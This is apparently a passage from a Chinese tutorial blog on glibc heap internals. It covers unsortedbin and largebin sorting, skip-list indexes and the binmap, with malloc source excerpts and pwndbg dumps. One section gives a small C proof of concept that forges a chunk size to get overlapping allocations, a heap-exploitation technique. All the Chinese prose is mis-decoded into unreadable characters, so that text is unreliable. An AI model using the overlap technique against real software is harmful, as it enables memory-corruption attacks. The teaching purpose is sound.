<p>2.åœ¨<code>free</code>æ—¶,å¦‚æœå †å—ä¸æ˜¯<code>mmap</code>çš„,å¹¶ä¸”<code>tcache</code>,<code>fastbins</code>éƒ½æ²¡èƒ½ç•™ä½å †å—,å¹¶ä¸”å †å—æ²¡æœ‰è¢«åˆå¹¶åˆ°<code>topchunk</code>,é‚£ä¹ˆå…¶å½’å®¿å°±æ˜¯<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))         <span class="comment">//å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);        <span class="comment">//å‘ååˆå¹¶</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">      not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">      been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);      <span class="comment">//æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.åœ¨mallocæ—¶,å¦‚æœä»<code>unsorted</code>ä¸­åˆ‡å‰²äº†ä¸€ä¸ªå¤§å—æ»¡è¶³ä¸€ä¸ªå°å—çš„åˆ†é…è¯·æ±‚,é‚£ä¹ˆå‰©ä½™å—ä¼šè¢«é‡æ–°æŒ‚åˆ°<code>unsortedbin</code>ä¸­</p>
<h5 id="free-1">free</h5>
<p>å¦‚æœä¸€ä¸ªå †å—è¢«<code>free</code>ä¹‹å,æ—¢æ²¡æœ‰è¢«<code>tcache</code>,<code>fastbins</code>ç•™ä½,ä¹Ÿä¸æ˜¯<code>mmap</code>æ˜ å°„å—,é‚£ä¹ˆæ­¤æ—¶è¯¥å †å—å¯èƒ½æœ‰ä¸¤ç§å½’å®¿:</p>
<p>1.ç‰©ç†ä¸Šä¸<code>topchunk</code>ç›¸é‚»,åˆå¹¶åˆ°<code>topchunk</code></p>
<p>2.ä¸ä¸<code>topchunk</code>ç›¸é‚»,æŒ‚åˆ°<code>unsortedbin</code>ä¸Š</p>
<p>[ä¸å¤ªå¯èƒ½å‘ç”Ÿçš„]å¦‚æœè¯¥å †å—è¿‡å¤§,è¶…è¿‡<code>fastbins</code>åˆå¹¶é˜ˆå€¼(64K),ä¼šè§¦å‘å †å†…å­˜ç¼©å‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))			<span class="comment">//émmapæ˜ å°„åŒº</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">// å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) <span class="comment">// å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        bck = unsorted_chunks(av); <span class="comment">// æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">		...</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">		...</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// åˆå¹¶åˆ°topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="malloc-2">malloc</h5>
<p>å½“<code>tcache</code>,<code>fastbins</code>,<code>smallbins</code>éƒ½æ²¡æœ‰æ»¡è¶³ä¸€æ¬¡åˆ†é…è¯·æ±‚,å¯èƒ½æ˜¯è¯·æ±‚å¤§å°å¤ªå¤§,æˆ–è€…å“¥ä»¨ç©·çš„å®å½“å“,åæ­£å°±æ˜¯æ²¡æ»¡è¶³</p>
<p>ä¸ºäº†åˆ©ç”¨å±€éƒ¨æ€§åŸåˆ™,<code>unsortedbin</code>ä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆ<code>last_remainder</code>,ä¹Ÿå°±æ˜¯æœ€åä¸€æ¬¡åˆ‡å‰²<code>unsortedbin</code>ä¸­å †å—åå‰©ä¸‹çš„éƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">å¤–åœˆå¾ªç¯</span><br><span class="line">	å†…åœˆå¾ªç¯éå†unsortedbin,å¯¹äºæ¯ä¸ªunsortedä¸­çš„å †å—:</span><br><span class="line">		å¦‚æœæ˜¯unsortedä¸­çš„å”¯ä¸€å †å—,å¹¶ä¸”è¯¥å—æ˜¯last_remainderå¹¶ä¸”è¿™å—è¶³å¤Ÿç›¸åº”è¯·æ±‚ åˆ™:</span><br><span class="line">			ç»§ç»­åˆ‡å®ƒ,*è¿”å›*éœ€è¦çš„,ç•™ä¸‹å¤šä½™çš„</span><br><span class="line">		å¦åˆ™å¯èƒ½æœ‰å¦‚ä¸‹æƒ…å†µ:<span class="number">1.</span>è¿™å—ä¸æ˜¯unsortedä¸­çš„å”¯ä¸€å— <span class="number">2.</span>ä¸æ˜¯last_remainder <span class="number">3.</span>ä¸å¤Ÿå¤§   æ­¤æ—¶åº”:</span><br><span class="line">			æŠŠå®ƒä»unsortedbinä¸Šæ‹†ä¸‹æ¥,ç„¶å:</span><br><span class="line">			å¦‚æœå¤§å°æ­£å¥½æ»¡è¶³è¯·æ±‚</span><br><span class="line">				å¦‚æœtcacheæœªæ»¡,åˆ™æ”¾åˆ°tcacheä¸­</span><br><span class="line">				å¦‚æœtcacheæ»¡äº†,æˆ–è€…æœªå¯ç”¨tcache,åˆ™ç›´æ¥*è¿”å›*</span><br><span class="line">			å¦åˆ™å¦‚æœå¤§å°åœ¨smallbinsèŒƒå›´å†…,åˆ™æ”¾åˆ°smallbinsä¸­</span><br><span class="line">			å¦åˆ™å¤§å°åœ¨largebinsèŒƒå›´å†…,åˆ™æ”¾åˆ°largebinsä¸­</span><br><span class="line">			å¦‚æœè¢«æ”¾åˆ°äº†tcacheä¸­,æ­¤æ—¶ä»tcacheä¸­æ‹¿ä¸€ä¸ª*è¿”å›*</span><br><span class="line">    å†…åœˆå¾ªç¯ç»“æŸ</span><br><span class="line">                </span><br><span class="line">	å¦‚æœç”³è¯·å¤§å°åœ¨largebinsèŒƒå›´,åˆ™å°è¯•ä½¿ç”¨largebinåˆ†é…</span><br><span class="line">	å¦‚æœåˆšæ‰çš„largebinæ²¡æœ‰æ»¡è¶³è¯·æ±‚,åˆ™éå†æ›´å¤§å·çš„largebinä¸­æ‰¾</span><br><span class="line">	å¦‚æœè¿˜æ²¡æ»¡è¶³,ä½¿ç”¨topchunkåˆ†é…</span><br><span class="line">	å¦‚æœè¿˜æ²¡æ»¡è¶³,ä½¿ç”¨sysmallocåˆ†é…</span><br><span class="line">                </span><br><span class="line">å¤–åœˆå¾ªç¯ç»“æŸ</span><br></pre></td></tr></table></figure>
<h4 id="exploit">exploit</h4>
<h5 id="overlap">overlap</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *p1;</span><br><span class="line">    <span class="type">size_t</span> *p2;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">// usable(0x400) + header(0x10)</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);  <span class="comment">// usable(0x40) + header(0x10)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *p1_size = (<span class="type">char</span>*)p1 - <span class="number">0x8</span>;      </span><br><span class="line">    *p1_size = <span class="number">0x461</span>;       <span class="comment">//suppose off by one ... </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);			<span class="comment">//in unsortedbin</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc overlap.c -o overlap -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./overlap</span><br><span class="line">p1: 0x5600128e52a0</span><br><span class="line">p1: 0x5600128e52a0</span><br></pre></td></tr></table></figure>
<h3 id="å¤§æ–Œlargebins">å¤§æ–ŒLargebins</h3>
<p><code>bin_at(M,64~126) =&gt; large bins</code>è¿™ä¸ªèŒƒå›´æ˜¯largetbin,ä¸€å…±æœ‰63ä¸ªbin</p>
<p>binå†…å †å—å¤§å°ç›¸ç­‰</p>
<p>binä¹‹é—´åˆ†äº†6ç»„,ç»„å†…å„ä¸ªbinå †å—å¤§å°æˆç­‰å·®æ•°åˆ—</p>
<table>
<thead>
<tr>
<th>ç»„</th>
<th>ä¸ªæ•°</th>
<th>å…¬å·®</th>
</tr>
</thead>
<tbody>
<tr>
<td>bin_at(M,64~95)</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>bin_at(M,96~111)</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>bin_at(M,112~119)</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>bin_at(M,120~123)</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>bin_at(M,124~125)</td>
<td>2</td>
<td>â€¦</td>
</tr>
<tr>
<td>bin_at(M,126)</td>
<td>1</td>
<td>â€¦</td>
</tr>
</tbody>
</table>
<h4 id="datastructure-2">datastructure</h4>
<p>å‡è®¾<code>largebins</code>çš„<code>bin_at(M,63)</code>ç›®å‰çš„çŠ¶æ€å¦‚ä¸‹:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x55555555dba0 â€”â–¸ 0x55555555dfe0 â€”â–¸ 0x55555555d340 â€”â–¸ 0x55555555d770 â€”â–¸ 0x55555555cb00 â€”â–¸ 0x55555555cf20 â€”â–¸ 0x7ffff7fa70d0 (main_arena+1104) â—‚â€” 0x55555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dba0</span><br><span class="line">0x55555555dba0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dbb0: 0x000055555555dfe0      0x00007ffff7fa70d0</span><br><span class="line">0x55555555dbc0: 0x000055555555d340      0x000055555555cb00</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dfe0</span><br><span class="line">0x55555555dfe0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dff0: 0x000055555555d340      0x000055555555dba0</span><br><span class="line">0x55555555e000: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d340</span><br><span class="line">0x55555555d340: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d350: 0x000055555555d770      0x000055555555dfe0</span><br><span class="line">0x55555555d360: 0x000055555555cb00      0x000055555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d770</span><br><span class="line">0x55555555d770: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d780: 0x000055555555cb00      0x000055555555d340</span><br><span class="line">0x55555555d790: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cb00</span><br><span class="line">0x55555555cb00: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cb10: 0x000055555555cf20      0x000055555555d770</span><br><span class="line">0x55555555cb20: 0x000055555555dba0      0x000055555555d340</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cf20</span><br><span class="line">0x55555555cf20: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cf30: 0x00007ffff7fa70d0      0x000055555555cb00</span><br><span class="line">0x55555555cf40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/2gx 0x7ffff7fa70d0+0x10</span><br><span class="line">0x7ffff7fa70e0 &lt;main_arena+1120&gt;:       0x000055555555dba0      0x000055555555cf20</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆç”»åˆ°å›¾ä¸Šé•¿è¿™é€¼æ ·</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030144119554.png"
alt="image-20241030144119554" />
<figcaption aria-hidden="true">image-20241030144119554</figcaption>
</figure>
<table>
<thead>
<tr>
<th>çº¿æ¡é¢œè‰²</th>
<th>æŒ‡é’ˆ</th>
</tr>
</thead>
<tbody>
<tr>
<td>è“</td>
<td>fd</td>
</tr>
<tr>
<td>ç»¿</td>
<td>bk</td>
</tr>
<tr>
<td>ç²‰</td>
<td>fd_nextsize</td>
</tr>
<tr>
<td>é»„</td>
<td>bk_nextsize</td>
</tr>
</tbody>
</table>
<p><strong>å®é™…ä¸Šlargebinå¯ä»¥çœ‹ä½œåŒå‘é“¾è¡¨, åˆåŠ ä¸Šäº†è·³è¡¨ç´¢å¼•</strong></p>
<h5 id="åŒå‘é“¾è¡¨">åŒå‘é“¾è¡¨</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145225118.png"
alt="åŒå‘é“¾è¡¨" />
<figcaption aria-hidden="true">åŒå‘é“¾è¡¨</figcaption>
</figure>
<h5 id="è·³è¡¨ç´¢å¼•">è·³è¡¨ç´¢å¼•</h5>
<p>é™„åŠ å¤´èŠ‚ç‚¹<code>bin_at(M,idx)</code>åªæœ‰<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆ,æ²¡æœ‰<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>è·³è¡¨ç´¢å¼•</p>
<p>æ‰€æœ‰å †å—é¦–å…ˆæŒ‰ç…§å¤§å°é™åºæ’åˆ—æˆåŒå‘é“¾è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x421]-&gt;[0x421]-&gt;[0x411]-&gt;[0x411]-&gt;[0x401]-&gt;[0x401]</span><br></pre></td></tr></table></figure>
<p>åªåœ¨ç›¸åŒå¤§å°çš„å †å—ç°‡çš„<strong>é¦–ä¸ªå †å—</strong>ä¸Šå»ºç«‹<strong>è·³è¡¨ç´¢å¼•</strong>,æŒ‡å‘<strong>ä¸‹ä¸€ä¸ªå¤§å°ä¸åŒçš„å †å—ç°‡</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145332777.png"
alt="è·³è¡¨ç´¢å¼•" />
<figcaption aria-hidden="true">è·³è¡¨ç´¢å¼•</figcaption>
</figure>
<h5 id="é“¾è¡¨è·³è¡¨">é“¾è¡¨+è·³è¡¨</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030150204350.png"
alt="image-20241030150204350" />
<figcaption aria-hidden="true">image-20241030150204350</figcaption>
</figure>
<h5 id="binmap">binmap</h5>
<p><code>binmap</code>ç”¨äºåœ¨<code>largebin</code>çš„ä¸­åŠ é€ŸæŸ¥æ‰¾æ›´å¤§çš„éç©ºçš„<code>bin</code></p>
<p><code>binmap</code>
æ˜¯<code>malloc_state</code>çš„æˆå‘˜,<code>4</code>ä¸ª<code>int</code>,å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ª<code>128</code>ä½çš„ä½å‘é‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="comment">//unsigned int binmap[4];</span></span><br></pre></td></tr></table></figure>
<p><code>i</code>
å°±æ˜¯æ ¹æ®å †å—å¤§å°è½åˆ°çš„<code>largebin</code>ä¸‹æ ‡<code>idx</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))		<span class="comment">//æ ‡è®°ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­æœ‰è‡³å°‘ä¸€ä¸ªå †å—</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))	<span class="comment">//æ ‡è®°ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­ä¸€ä¸ªå †å—ä¹Ÿæ²¡æœ‰</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))		<span class="comment">//æŸ¥çœ‹ä¸‹æ ‡ä¸ºiçš„æ¡¶å­ä¸­æœ‰æ²¡æœ‰å †å—</span></span></span><br></pre></td></tr></table></figure>
<p>æ¯”å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(m,63) </span><br><span class="line">	binmap[63&gt;&gt;5] |= ((1U &lt;&lt; ((63) &amp; ((1U &lt;&lt; 5) - 1))))</span><br><span class="line">	binmap[1] |= (1&lt;&lt;31)</span><br><span class="line">	</span><br><span class="line">mark_bin(m,64)</span><br><span class="line">	binmap[2] |= (1&lt;&lt;0)</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯å¯¹äº<code>largebin</code>æ¥è¯´,<code>binmap[0]</code>æ°¸è¿œç”¨ä¸åˆ°</p>
<h4 id="algorithm-4">algorithm</h4>
<p><code>largebin</code>ä¸­çš„å †å—,åªèƒ½æ˜¯æ¥è‡ªäº<code>unsortedbin</code></p>
<p>å¦‚æœæŸæ¬¡<code>malloc</code>æ²¡æœ‰ä»<code>tcache,fastbins,smallbins</code>,ä¸­å¾—åˆ°æƒ³è¦çš„å †å—</p>
<p>æ­¤æ—¶éœ€è¦éå†<code>unsortedbin</code>,æ•´ç†å…¶ä¸­çš„æ‰€æœ‰å †å—,å½’ç±»åˆ°<code>smallbins</code>æˆ–è€…<code>largebins</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unsortedbinæ•´ç†ç®—æ³•:</span></span><br><span class="line"></span><br><span class="line">å¦‚æœunsortedbinåªæœ‰last_remainderå¹¶ä¸”ä»–èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚</span><br><span class="line">	é‚£ä¹ˆä»last_remainderå¤´éƒ¨åˆ‡å‡ºéœ€æ±‚,å‰©ä¸‹çš„ç»§ç»­ä½œä¸ºlast_remainder,ç„¶åè¿”å›</span><br><span class="line"></span><br><span class="line">å¦åˆ™ å°†unsortedä¸Šçš„è¿™å—å…ˆæ‹¿ä¸‹æ¥</span><br><span class="line">	å¦‚æœè¿™å—çš„å¤§å°æ­£å¥½ç­‰äºéœ€æ±‚</span><br><span class="line">		å¦‚æœtcacheä¸æ»¡åˆ™å…ˆæ¬åˆ°tcacheå¹¶è®°ä¸‹tcacheå¯ä»¥æ»¡è¶³,<span class="keyword">continue</span>, åœ¨æ•´ç†å®Œæ‰€æœ‰unsortedbinä¹‹åå†è¿”å›, æ•´ç†è¿‡ç¨‹ä¸­å¦‚æœtcacheæ»¡äº†ä¹Ÿä¼šè¿”å›</span><br><span class="line">		å¦åˆ™tcacheæ»¡åˆ™ç›´æ¥è¿”å›</span><br><span class="line">	å¦åˆ™</span><br><span class="line">		å¦‚æœè¿™å—åœ¨smallbinèŒƒå›´å†…å°±æ”¾åˆ°smallbin</span><br><span class="line">		å¦åˆ™è¿™å—åœ¨largebinèŒƒå›´å†…å°±æ”¾åˆ°largebin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å°†<code>unsortedbin</code>å †å—æ”¾åˆ°<code>smallbins</code>ä¸­æ—¶éå¸¸ç®€å•,å› ä¸º<code>smallbins</code>ä¸­çš„å †å—å¤§å°å’Œæ¡¶å­ä¸‹æ ‡æœ‰ä¸¥æ ¼çš„å…³ç³»,æ ¹æ®å †å—å¤§å°è®¡ç®—å‡ºä¸‹æ ‡,å¤´æ’æ³•ä¸€å¡å°±å®Œäº†</p>
<p><strong>ä½†æ˜¯å¾€<code>largebin</code>æ”¾æ—¶,ä¸€ä¸ª<code>bin</code>é‡Œé¢å¯èƒ½ä¼šæœ‰ä¸åŒå¤§å°çš„å †å—,éœ€è¦å…ˆé€šè¿‡è·³è¡¨ç´¢å¼•è¿›è¡Œæ’å…¥æ’åº</strong></p>
<h5 id="æ’å…¥æ›´å°çš„å †å—">æ’å…¥æ›´å°çš„å †å—</h5>
<p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x411</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x401</code>çš„å †å—æ”¾è¿›å»</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101203700160.png"
alt="image-20241101203700160" />
<figcaption aria-hidden="true">image-20241101203700160</figcaption>
</figure>
<h5 id="æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—">æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—</h5>
<p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x411,0x401</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x411</code>çš„å †å—æ”¾è¿›å»,é‚£ä¹ˆè¿‡ç¨‹å°†ä¼šæ˜¯è¿™æ ·çš„:</p>
<p>0.è®¡ç®—å¾—çŸ¥<code>0x411</code>è½åœ¨<code>bin_at(M,63)</code>èŒƒå›´</p>
